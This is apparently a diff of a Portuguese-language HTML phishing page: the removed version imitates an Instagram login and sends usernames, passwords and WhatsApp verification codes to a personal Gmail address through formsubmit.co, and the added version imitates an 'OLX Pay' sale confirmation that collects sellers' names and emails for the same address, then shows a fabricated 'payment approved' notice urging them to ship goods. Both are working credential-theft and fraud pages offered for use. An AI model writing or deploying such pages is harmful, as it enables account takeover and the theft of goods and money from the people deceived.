@@ -1,150 +1,110 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <title>Confirmação de Venda - OLX Pay</title>
   <style>
     body {
-      background-color: #fafafa;
-      font-family: 'Roboto', sans-serif;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      flex-direction: column;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #333;
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 20px;
     }
-
-    .container {
-      background: white;
-      padding: 40px 30px;
-      border: 1px solid #ddd;
-      text-align: center;
-      width: 100%;
-      max-width: 320px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-      margin: auto;
-    }
-
     .logo {
-      width: 120px;
-      margin-bottom: 25px;
+      text-align: center;
+      margin-bottom: 20px;
     }
-
-    input, button {
+    .logo img {
+      width: 140px;
+    }
+    h2 {
+      color: #ff6600;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input {
       width: 100%;
       padding: 10px;
-      margin: 8px 0;
+      margin-top: 5px;
       border: 1px solid #ccc;
       border-radius: 5px;
-      font-size: 14px;
-      box-sizing: border-box;
     }
-
-    button {
-      background-color: #3897f0;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
+    .btn {
+      margin-top: 20px;
+      width: 100%;
+      background-color: #ff6600;
+      color: #fff;
+      padding: 12px;
       border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
     }
-
-    button:hover {
-      background-color: #318bda;
-    }
-
-    .footer {
-      font-size: 12px;
-      color: #999;
-      margin-top: 15px;
-    }
-
     .hidden {
       display: none;
     }
-
-    .loading img {
-      width: 40px;
-      margin-bottom: 10px;
-      animation: spin 1s linear infinite;
+    .confirmacao {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 30px;
     }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .confirmacao h3 {
+      color: #ff6600;
     }
   </style>
 </head>
 <body>
-  <div class="container" id="login">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
-    <form id="loginForm">
-      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
-      <input type="password" name="password" placeholder="Senha" required />
-      <button type="submit">Entrar</button>
-    </form>
-    <div class="footer">© 2025 Instagram from Meta</div>
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/OLX_New_Logo.svg/2560px-OLX_New_Logo.svg.png" alt="OLX Logo">
   </div>
 
-  <div class="container hidden" id="codigo">
-    <h3>Verificação de segurança</h3>
-    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
-    <form id="codigoForm">
-      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
-      <button type="submit">Confirmar</button>
-    </form>
-  </div>
+  <h2>Confirmação de Venda - OLX Pay</h2>
 
-  <div class="container hidden" id="carregando">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Verificando código...</p>
-    </div>
-  </div>
+  <form id="vendaForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" onsubmit="mostrarConfirmacao(); return true;">
+    <label for="nome">Seu nome completo:</label>
+    <input type="text" id="nome" name="nome" required>
 
-  <div class="container hidden" id="final">
-    <h2>Parabéns!</h2>
-    <p>Cadastro realizado com sucesso.</p>
-    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
+    <label for="email">Seu e-mail OLX:</label>
+    <input type="email" id="email" name="email" required>
+
+    <label for="produto">Produto vendido:</label>
+    <input type="text" id="produto" name="produto" required>
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://www.olx.com.br/">
+
+    <button type="submit" class="btn">Confirmar venda</button>
+  </form>
+
+  <div id="confirmacao" class="confirmacao hidden">
+    <h3>Pagamento aprovado – envie seu produto</h3>
+    <p>Parabéns! Você realizou uma venda com sucesso através do OLX Pay.</p>
+    <p><strong>Produto vendido:</strong> Produto informado</p>
+    <p><strong>Valor:</strong> R$ 350,00</p>
+    <p><strong>Forma de envio:</strong> Correios (frete pago)</p>
+    <p><strong>Código de postagem:</strong> BR345671234BR</p>
+    <p>Leve seu produto embalado até uma agência dos Correios e informe o código acima.</p>
+    <p><strong>Status do pagamento:</strong> Aprovado</p>
+    <p><strong>Status da venda:</strong> Aguardando envio</p>
   </div>
 
   <script>
-    const loginForm = document.getElementById("loginForm");
-    const codigoForm = document.getElementById("codigoForm");
-
-    loginForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("login").classList.add("hidden");
-      document.getElementById("codigo").classList.remove("hidden");
-
-      const dados = new FormData(loginForm);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dados
-      });
-    });
-
-    codigoForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("codigo").classList.add("hidden");
-      document.getElementById("carregando").classList.remove("hidden");
-
-      const dadosCodigo = new FormData(codigoForm);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dadosCodigo
-      });
-
+    function mostrarConfirmacao() {
       setTimeout(() => {
-        document.getElementById("carregando").classList.add("hidden");
-        document.getElementById("final").classList.remove("hidden");
-      }, 2500);
-    });
+        document.getElementById('vendaForm').classList.add('hidden');
+        document.getElementById('confirmacao').classList.remove('hidden');
+      }, 500);
+    }
   </script>
 </body>
 </html>
